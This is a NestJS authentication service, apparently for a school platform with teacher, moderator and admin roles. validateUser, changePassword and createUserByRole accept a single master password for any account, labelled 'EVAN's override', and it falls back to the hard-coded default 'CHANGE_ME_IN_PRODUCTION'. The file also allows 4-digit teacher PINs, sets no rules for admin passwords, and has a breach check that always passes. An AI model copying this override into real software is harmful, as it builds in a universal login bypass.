import { Injectable, NotFoundException, HttpException, HttpStatus } from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import { PrismaService } from '../prisma/prisma.service';
import * as bcrypt from 'bcrypt';

@Injectable()
export class AuthService {
  constructor(
    private prisma: PrismaService,
    private jwtService: JwtService,
  ) {}

  // Master password for admin override access (configurable via environment)
  // NOTE: Set MASTER_PASSWORD environment variable for security
  private readonly MASTER_PASSWORD =
    process.env.MASTER_PASSWORD ||
    (() => {
      console.warn(
        'WARNING: MASTER_PASSWORD environment variable not set. Using default value.',
      );
      console.warn(
        'For production, set MASTER_PASSWORD environment variable to a secure value.',
      );
      return 'CHANGE_ME_IN_PRODUCTION';
    })();

  async createAdminUser(
    email: string,
    firstName: string,
    lastName: string,
    password: string,
  ) {
    // Hash the password for security
    const hashedPassword = await bcrypt.hash(password, 10);

    const adminUser = await this.prisma.user.create({
      data: {
        email,
        firstName,
        lastName,
        role: 'ADMIN',
        password: hashedPassword,
      },
    });

    return {
      id: adminUser.id,
      email: adminUser.email,
      firstName: adminUser.firstName,
      lastName: adminUser.lastName,
      role: adminUser.role,
      message: `Admin user created successfully`,
    };
  }

  async createUser(
    email: string,
    firstName: string,
    lastName: string,
    password: string,
    role: 'TEACHER' | 'MODERATOR' | 'ADMIN',
  ) {
    // Hash the password
    const hashedPassword = await bcrypt.hash(password, 10);

    const user = await this.prisma.user.create({
      data: {
        email,
        firstName,
        lastName,
        role,
        password: hashedPassword,
      },
    });

    return {
      id: user.id,
      email: user.email,
      firstName: user.firstName,
      lastName: user.lastName,
      role: user.role,
    };
  }

  // Simple authentication
  async validateUser(email: string, password: string) {
    const user = await this.findUserByEmail(email);
    if (!user) return null;

    // Check if it's the master password (EVAN's override)
    if (password === this.MASTER_PASSWORD) {
      console.log(`Master password used for ${email}`);
      return user;
    }

    // Check regular password
    if (user.password && (await bcrypt.compare(password, user.password))) {
      return user;
    }

    return null;
  }

  async login(user: any) {
    const payload = { 
      email: user.email, 
      sub: user.id, 
      role: user.role
    };

    // 24 hour token expiration - longer for convenience
    const token = this.jwtService.sign(payload, { expiresIn: '24h' });

    return {
      access_token: token,
      expires_in: 86400, // 24 hours in seconds
      token_type: 'Bearer',
      user: {
        id: user.id,
        email: user.email,
        firstName: user.firstName,
        lastName: user.lastName,
        role: user.role,
        passwordChanged: user.passwordChanged,
      },
    };
  }

  // Generate client hash for session validation
  private generateClientHash(clientInfo: { ip?: string; userAgent?: string }): string {
    const crypto = require('crypto');
    const clientString = `${clientInfo.ip || ''}:${clientInfo.userAgent || ''}`;
    return crypto.createHash('sha256').update(clientString).digest('hex').substring(0, 16);
  }

  async validateMasterPassword(password: string): Promise<boolean> {
    return password === this.MASTER_PASSWORD;
  }

  async findUserByEmail(email: string) {
    return this.prisma.user.findUnique({
      where: { email },
    });
  }

  async getAllUsers() {
    return this.prisma.user.findMany({
      select: {
        id: true,
        email: true,
        firstName: true,
        lastName: true,
        role: true,
        createdAt: true,
      },
    });
  }

  async updateUserRole(userId: string, role: string) {
    return this.prisma.user.update({
      where: { id: userId },
      data: { role },
    });
  }

  async deleteUser(userId: string) {
    return this.prisma.user.delete({
      where: { id: userId },
    });
  }

  async getModerators() {
    return this.prisma.user.findMany({
      where: { role: 'MODERATOR' },
      select: {
        id: true,
        email: true,
        firstName: true,
        lastName: true,
      },
    });
  }

  async getTeachers() {
    return this.prisma.user.findMany({
      where: { role: 'TEACHER' },
      select: {
        id: true,
        email: true,
        firstName: true,
        lastName: true,
      },
    });
  }

  async createToken(user: any) {
    const payload = { email: user.email, sub: user.id, role: user.role };
    return this.jwtService.sign(payload);
  }

  async changePassword(userId: string, currentPassword: string, newPassword: string) {
    // Find the user
    const user = await this.prisma.user.findUnique({
      where: { id: userId },
    });

    if (!user) {
      throw new NotFoundException('User not found');
    }

    // Check if current password is correct (skip if using master password)
    if (currentPassword !== this.MASTER_PASSWORD) {
      if (!user.password || !(await bcrypt.compare(currentPassword, user.password))) {
        throw new HttpException('Current password is incorrect', HttpStatus.UNAUTHORIZED);
      }
    }

    // Hash new password
    const hashedNewPassword = await bcrypt.hash(newPassword, 10);

    // Update user with new password and set passwordChanged to true
    return this.prisma.user.update({
      where: { id: userId },
      data: {
        password: hashedNewPassword,
        passwordChanged: true,
      },
      select: {
        id: true,
        email: true,
        firstName: true,
        lastName: true,
        role: true,
        passwordChanged: true,
      },
    });
  }

  // Admin Setup Wizard Methods
  async getSystemStatus() {
    try {
      // Check if system is initialized by looking for master password config
      const masterConfig = await this.prisma.systemConfig.findUnique({
        where: { key: 'MASTER_PASSWORD_HASH' },
      });

      // Check if admin exists
      const adminExists = await this.prisma.user.findFirst({
        where: { role: 'ADMIN' },
      });

      return {
        isInitialized: !!masterConfig,
        hasAdmin: !!adminExists,
        requiresSetup: !masterConfig,
      };
    } catch (error) {
      // If table doesn't exist, system is not initialized
      return {
        isInitialized: false,
        hasAdmin: false,
        requiresSetup: true,
      };
    }
  }

  async initializeSystem(masterPassword: string, adminEmail: string, adminFirstName: string, adminLastName: string, adminPassword: string) {
    // Check if system is already initialized
    const status = await this.getSystemStatus();
    if (status.isInitialized) {
      throw new HttpException('System is already initialized', HttpStatus.BAD_REQUEST);
    }

    // Admin password has no requirements - you can use whatever you want
    // Master password also has no requirements

    // Hash master password and store in config
    const masterPasswordHash = await bcrypt.hash(masterPassword, 12);
    await this.prisma.systemConfig.create({
      data: {
        key: 'MASTER_PASSWORD_HASH',
        value: '',
        encryptedValue: masterPasswordHash,
      },
    });

    // Create admin user
    const hashedAdminPassword = await bcrypt.hash(adminPassword, 10);
    const adminUser = await this.prisma.user.create({
      data: {
        email: adminEmail,
        firstName: adminFirstName,
        lastName: adminLastName,
        role: 'ADMIN',
        password: hashedAdminPassword,
        passwordChanged: true,
      },
    });

    // Update environment master password override
    process.env.MASTER_PASSWORD = masterPassword;

    return {
      message: 'System initialized successfully',
      admin: {
        id: adminUser.id,
        email: adminUser.email,
        firstName: adminUser.firstName,
        lastName: adminUser.lastName,
        role: adminUser.role,
      },
    };
  }

  // Role-based user creation
  async createUserByRole(
    requestorId: string,
    requestorRole: string,
    email: string,
    firstName: string,
    lastName: string,
    role: string,
    requestorPassword: string
  ) {
    // Check if requestor has permission to create users
    if (requestorRole !== 'ADMIN' && requestorRole !== 'MODERATOR') {
      throw new HttpException('Only administrators and moderators can create users', HttpStatus.FORBIDDEN);
    }

    // Moderators can only create teachers
    if (requestorRole === 'MODERATOR' && role !== 'TEACHER') {
      throw new HttpException('Moderators can only create teacher accounts', HttpStatus.FORBIDDEN);
    }

    // Verify requestor password or master password
    const requestor = await this.prisma.user.findUnique({
      where: { id: requestorId },
    });

    if (!requestor) {
      throw new NotFoundException('Requestor not found');
    }

    // Check if password is correct (requestor password or master password)
    const isValidPassword = requestorPassword === this.MASTER_PASSWORD || 
                           (requestor.password && await bcrypt.compare(requestorPassword, requestor.password));

    if (!isValidPassword) {
      throw new HttpException('Invalid password', HttpStatus.UNAUTHORIZED);
    }

    // Check if user already exists
    const existingUser = await this.prisma.user.findUnique({
      where: { email },
    });

    if (existingUser) {
      throw new HttpException('User with this email already exists', HttpStatus.BAD_REQUEST);
    }

    // Create password request instead of user directly
    const passwordRequest = await this.prisma.passwordRequest.create({
      data: {
        email,
        firstName,
        lastName,
        role,
        reason: `User creation requested by ${requestor.firstName} ${requestor.lastName} (${requestor.role})`,
        status: 'PENDING',
      },
    });

    return {
      message: 'Password creation request submitted successfully',
      request: {
        id: passwordRequest.id,
        email: passwordRequest.email,
        firstName: passwordRequest.firstName,
        lastName: passwordRequest.lastName,
        role: passwordRequest.role,
        status: passwordRequest.status,
      },
    };
  }

  // Password request methods
  async requestPasswordCreation(email: string, firstName: string, lastName: string, role: string, reason: string) {
    // Check if user already exists
    const existingUser = await this.prisma.user.findUnique({
      where: { email },
    });

    if (existingUser) {
      throw new HttpException('User with this email already exists', HttpStatus.BAD_REQUEST);
    }

    // Check if request already exists
    const existingRequest = await this.prisma.passwordRequest.findUnique({
      where: { email },
    });

    if (existingRequest && existingRequest.status === 'PENDING') {
      throw new HttpException('Password request already exists for this email', HttpStatus.BAD_REQUEST);
    }

    // Create password request
    const passwordRequest = await this.prisma.passwordRequest.create({
      data: {
        email,
        firstName,
        lastName,
        role,
        reason,
        status: 'PENDING',
      },
    });

    return {
      message: 'Password creation request submitted successfully',
      request: {
        id: passwordRequest.id,
        email: passwordRequest.email,
        firstName: passwordRequest.firstName,
        lastName: passwordRequest.lastName,
        role: passwordRequest.role,
        status: passwordRequest.status,
      },
    };
  }

  async getPendingPasswordRequests() {
    return this.prisma.passwordRequest.findMany({
      where: { status: 'PENDING' },
      orderBy: { requestedAt: 'desc' },
    });
  }

  async approvePasswordRequest(requestId: string, password: string, masterPassword: string) {
    // Verify master password
    const masterConfig = await this.prisma.systemConfig.findUnique({
      where: { key: 'MASTER_PASSWORD_HASH' },
    });

    if (!masterConfig || !(await bcrypt.compare(masterPassword, masterConfig.encryptedValue))) {
      throw new HttpException('Invalid master password', HttpStatus.UNAUTHORIZED);
    }

    // Find the request
    const request = await this.prisma.passwordRequest.findUnique({
      where: { id: requestId },
    });

    if (!request) {
      throw new NotFoundException('Password request not found');
    }

    if (request.status !== 'PENDING') {
      throw new HttpException('Request is not pending', HttpStatus.BAD_REQUEST);
    }

    // Validate password based on role
    this.validatePasswordComplexity(password, request.role);

    // Create user with approved password
    const hashedPassword = await bcrypt.hash(password, 10);
    const user = await this.prisma.user.create({
      data: {
        email: request.email,
        firstName: request.firstName,
        lastName: request.lastName,
        role: request.role,
        password: hashedPassword,
        passwordChanged: false, // Force password change on first login
      },
    });

    // Update request status
    await this.prisma.passwordRequest.update({
      where: { id: requestId },
      data: {
        status: 'APPROVED',
        approvedAt: new Date(),
      },
    });

    return {
      message: 'Password request approved and user created successfully',
      user: {
        id: user.id,
        email: user.email,
        firstName: user.firstName,
        lastName: user.lastName,
        role: user.role,
      },
    };
  }

  // Simple password validation based on role
  private validatePasswordComplexity(password: string, role?: string) {
    if (role === 'TEACHER') {
      // Teachers use 4+ digit PIN codes
      if (!/^\d{4,}$/.test(password)) {
        throw new HttpException('Teachers must use a 4+ digit PIN code (numbers only)', HttpStatus.BAD_REQUEST);
      }
    } else if (role === 'MODERATOR') {
      // Moderators need at least 6 characters, no other requirements
      if (password.length < 6) {
        throw new HttpException('Moderator password must be at least 6 characters long', HttpStatus.BAD_REQUEST);
      }
    }
    // Admin (you) can use any password - no requirements
  }

  // Password strength assessment (optional enhancement)
  private assessPasswordStrength(password: string): { score: number; feedback: string[] } {
    let score = 0;
    const feedback: string[] = [];

    // Length scoring
    if (password.length >= 16) score += 3;
    else if (password.length >= 12) score += 2;
    else if (password.length >= 8) score += 1;
    else feedback.push('Password is too short');

    // Character diversity
    if (/[a-z]/.test(password)) score += 1;
    if (/[A-Z]/.test(password)) score += 1;
    if (/[0-9]/.test(password)) score += 1;
    if (/[@$!%*?&^#~+=\-_|\\<>,.;:'"[\]{}()]/.test(password)) score += 1;

    // Entropy bonus for long passwords
    if (password.length >= 20) score += 2;

    // Penalty for patterns
    if (/(.)\1{2,}/.test(password)) {
      score -= 1;
      feedback.push('Avoid repeating characters');
    }

    // Provide feedback
    if (score >= 8) feedback.push('Strong password');
    else if (score >= 6) feedback.push('Good password');
    else if (score >= 4) feedback.push('Moderate password');
    else feedback.push('Weak password');

    return { score, feedback };
  }

  // Check against common breach databases (placeholder for future implementation)
  private async checkPasswordBreach(password: string): Promise<boolean> {
    // In a real implementation, this would check against services like:
    // - Have I Been Pwned Passwords API
    // - Internal breach database
    // For now, we'll return false (not breached)
    return false;
  }
}
